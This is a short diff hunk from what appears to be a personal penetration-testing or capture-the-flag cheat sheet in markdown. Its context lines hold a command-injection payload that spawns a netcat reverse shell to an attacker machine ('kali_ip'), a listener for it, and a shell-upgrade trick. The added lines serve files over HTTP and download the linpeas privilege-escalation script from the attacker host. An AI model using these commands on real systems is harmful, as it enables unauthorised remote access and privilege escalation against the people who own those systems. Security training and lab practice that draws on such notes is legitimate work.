@@ -62,6 +62,10 @@ $(/bin/nc -e /bin/sh kali_ip 8888 &)
 nc -nvlp 8888
 /usr/bin/script -qc /bin/bash /dev/null
 
+python3 -m http.server 80
+wget http://kali/linpeas
+
+
 
 ```
 
